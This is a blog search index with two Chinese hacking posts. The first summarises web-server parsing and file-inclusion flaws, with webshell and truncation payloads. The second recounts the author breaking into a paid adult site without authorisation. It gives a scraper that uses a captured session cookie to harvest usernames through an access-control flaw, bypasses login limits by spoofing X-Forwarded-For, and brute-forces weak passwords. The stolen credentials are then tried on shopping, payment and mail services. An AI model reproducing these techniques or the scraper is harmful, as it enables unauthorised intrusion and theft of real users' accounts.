<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[文件上传的那些事（上）]]></title>
      <url>http://www.warmeng.com/2017/04/09/the_upload(f)/</url>
      <content type="html"><![CDATA[<p>文件上传的那些故事，不想在到网上搜着看了，s是时候来汇总收集一波了，大部分内容由nmask大神博客转载！<br><a href="http://thief.one/" target="_blank" rel="external">nmask</a></p>
<a id="more"></a>
<hr>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传是web应用中经常出现的功能，他允许用户上传文件到服务器并保存到特定的位置。这对安全来说是一个很敏感的问题，一旦恶意的应用程序被上传到服务器并获取到执行权限，后果将不堪设想。</p>
<hr>
<h2 id="文件上传先从解析漏洞开始"><a href="#文件上传先从解析漏洞开始" class="headerlink" title="文件上传先从解析漏洞开始"></a>文件上传先从解析漏洞开始</h2><p>###IIS5.X-IIS6.X<br>大多数用该容器的网站系统都是windows2003，用的脚本多为asp，一旦木马上传成功拥有较大的权限，该解析漏洞也只能asp文件，而不能解析aspx文件。<br>   目录解析：<br>  /xx.asp/xx.jpg<br>在网站下建立文件夹的名字为.asp,.asa,.cer的文件夹,该目录的任何扩展名的文件都被IIS当做asp文件来解析并且执行<br>   文件解析:<br>  xx.asp;.jgp<br>在IIS6.0下，分号后面的不被解析，也就是说在IIS6.0默认的可执行的文件中还包含xx.asa,xx.cer,xx.cdx这三种</p>
<p>###iis 7.0/iis7.5/Nginx <8.03畸形解析漏洞 在默认fast-cgi开启的状况下，黑阔上传一个名字为wooyun.jpg，内容为<?php="" fputs(‘shell.php’,’w’),’<?php="" eval($_post[cmd]?)="">’);?&gt;的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马</8.03畸形解析漏洞></p>
<p>###Nginx<br>0.5，0.6,0.7&lt;=0.7.65&amp;&amp;08&lt;=0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问XXX.JPG%00.PHP来执行其中的代码<br>0.5.<em>&amp;&amp;0.6.</em>&amp;&amp;0.7&lt;=0.7.65&amp;&amp;0.8&lt;=0.8.37<br>在以上NGINX容器的版本下，上传一个在WAF白名单之内扩展名的文件shell.jpg,然后用shell.jpg.php警醒请求<br>0.8.041-1.5.6<br>在以上的NGINX容器的版本下，上传一个waf白名单之内扩展名的文件shell.jpg，然后用shell.jpg%20.php进行请求</p>
<p>###apache<br>Apache是从右到左开始判断解析，如果为不可识别解析，就在往左边判断.比如说wooyun.php.owf.rar，后面两种后缀是apache不可识别解析的，apache就会把该文件解析成php，所以如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个wooyun.php.rara.xxx…..（反正就是随意填）去测试是否是合法的后缀</p>
<p>##其他<br>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>  如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<hr>
<p>##文件包含漏洞</p>
<p>###本地包含</p>
<p>普通本地包含<br>&lt;?php include_once(&amp;_GET[‘f’]); ?&gt;</p>
<p> Php?f=1.txt</p>
<p>截断本地包含<br>Magic_quote_gpc为off的情况使用<br>Php?=1.txt%00</p>
<p>长文件名截断</p>
<p>&lt;?php  include_once($_GET[‘f’].”.php”); ?&gt;<br>Php?f=1.txt/././././././././././././././././././…………php</p>
<p>###远程包含<br>这种默认情况下关闭的套路别用了，愁人！还有些什么session文件包含一句话什么的看不懂，暂时不研究。</p>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gitshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[通過黃色網站對用戶的社工]]></title>
      <url>http://www.warmeng.com/2017/04/05/hweb/</url>
      <content type="html"><![CDATA[<p>一次和龍灣大佬合作的的實戰記錄，這次的實戰過程給我一個警醒。</p>
<p> 不管你的密碼是否複雜，永遠不要在所有的網站上使用同一個密碼。不然真的真的真的很危險。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–by warmeng and orleven</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>該黃色網站由某位廣告老司機發佈在群中，（由於博主還是一個純真的少年，這裡就不開車發網址了~）登陸該網址發現必須要買會員才能看裡面的資源，加入會員需要50塊錢的入會費，呵呵噠，我等屌絲窮逼什麼時候能承受這麼一筆天價巨款！！日站！！</p>
<h2 id="信息收集與準備工作"><a href="#信息收集與準備工作" class="headerlink" title="信息收集與準備工作"></a>信息收集與準備工作</h2><p>cms版本：dizcus<br>腳本：php<br>系統：windows<br>容器：Nginx<br>各種滲透工具：burpsuite，awvs，nmap，dirsearch，御劍，龍灣大佬自製腳本（小型爬蟲）<br>註冊會員名單若干。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">$ </div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"</span></div><div class="line">header[<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"UM_distinctid=15b376519ba53e-007c3d87be62c08-1262694a-144000-15b376519bb462; CNZZDATA1261494228=831009649-1491280862-%7C1491291663; Ytbs_2132_saltkey=HHsNZ9Hr; Ytbs_2132_lastvisit=1491285722; Ytbs_2132_sid=BICooo; Ytbs_2132_lastact=1491293284%09misc.php%09patch; Ytbs_2132_home_diymode=1; Ytbs_2132_sendmail=1; Ytbs_2132_ulastactivity=816dDp017aWFAasznplKs9EHKYb9Od2auDpLW0iBm%2FTWqLOzFZVV; Ytbs_2132_auth=459esi4d2DZpue0D6iCJsczCsnO4LrzJk6UAT4CEFtTS4hentR2om0QocI2q1ojqlszIzumjgzg1TBrNrpYJWXSl%2FQ; Ytbs_2132_lastcheckfeed=46107%7C1491293279; Ytbs_2132_checkfollow=1; Ytbs_2132_lip=183.157.172.91%2C1491284503; Ytbs_2132_checkpm=1; Ytbs_2132_noticeTitle=1; tjpctrl=1491295070306"</span></div><div class="line">indexUrl = <span class="string">"http://www.lolibus.com/?"</span></div><div class="line"></div><div class="line"></div><div class="line">def index(num,indexUrl):</div><div class="line">    <span class="keyword">for</span> userid <span class="keyword">in</span> xrange(num * 5000, ( num +1) * 5000 ):</div><div class="line">        try:</div><div class="line">            targetUrl = indexUrl + str(userid)</div><div class="line">            results = request.get(targetUrl,headers=header)</div><div class="line">            <span class="comment"># print results.content</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"待推广会"</span> not <span class="keyword">in</span>  results.content:</div><div class="line">                username = str(BeautifulSoup(results.content).title)</div><div class="line">                username = username[7:username.find(<span class="string">"的个人资料"</span>)]</div><div class="line">                <span class="built_in">print</span> username</div><div class="line">        except:</div><div class="line">            <span class="comment"># print "[-] Not Available !"</span></div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(0,10):</div><div class="line">        t =  threading.Thread(target=index,args=(num,indexUrl,))</div><div class="line">        t.start()</div><div class="line">        threads.append(t)</div></pre></td></tr></table></figure></p>
<h2 id="滲透思路與過程"><a href="#滲透思路與過程" class="headerlink" title="滲透思路與過程"></a>滲透思路與過程</h2><p>找對應cms公開的漏洞———-失敗！完全不會這個，從來沒有成功過關<br>掃描端口以及對應後台———-成功！掃出一個wdcp登陸的後台<br>爆破管理與賬號密碼———–失敗，并被鎖定ip！<br>註冊用戶———-失敗，交50塊錢的入會費，交不起！<br>爆破正式會員的弱口令———-成功！各種小電影隨便看！<br>越權漏洞———–成功！觀看任意用戶的用戶名！<br>通過正式會員修改頭像方式文件上傳————失敗！網頁白名單限制，沒有解析漏洞，也沒有通過截斷上傳！<br>通過正式會員修改個人資料及發送消息進行XSS攻擊———–失敗！XSS並不是很熟練，但是也看出該網站對XSS進行了過濾！<br>滲透方面，并咩有找到什麼能getshell的辦法，很氣，怎麼辦，我也很絕望！</p>
<hr>
<p>滲透沒有什麼突破，但是獲得了一個很重要的信息，我們能通過越權看到任意用戶的用戶名  xxxx?id=x  的url形式，我們只需要通過修改x的值就能得到任意用戶的用戶名，得到用戶名，進行批量的爆破，由此可證，量變引起質變。用龍灣大佬自製的腳本對正式會員用戶進行爬取<br><img src="/images/20170405/1.png" alt=""></p>
<hr>
<p>發現到用戶登錄的地方沒有驗證碼的限制，但是有登錄錯誤次數的限制<br><img src="/images/20170405/2.png" alt=""></p>
<hr>
<p>發現該網站用戶登錄的登錄限制是通過ip和用戶名一起的,即同一個用戶和同一個IP地址只能輸入5次,但是IP的限制我們可以通過修改X-Forwarded-For的方式繞過,用戶名就沒有辦法羅！<br><img src="/images/20170405/3.png" alt=""></p>
<hr>
<p>思考階段，我們隊爬取出來的用戶表進行了分析，如果用戶名是英文的尤其是那種幾個字母加上數字及其有可能用戶名==密碼。由此爆破出很多正式用後的賬號密碼，盜號成功！登錄！<br>人人網，12306，網易郵箱，支付寶，淘寶，京東，智聯，趕集全部撞庫成功！由於支付寶，淘寶等需要手機驗證，不會繞過，就此作罷。<br><img src="/images/20170405/10.png" alt=""><br><img src="/images/20170405/11.png" alt=""></p>
<hr>
<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>博主還只是小菜狗一隻，需要更強大的技術來getshell，來入侵，希望得到更多大佬的指點與解惑。通過這次也警醒了大家要慎重的考慮自己的密碼。</p>
]]></content>
      
        <categories>
            
            <category> 實戰過程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 社工 </tag>
            
            <tag> 實戰 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
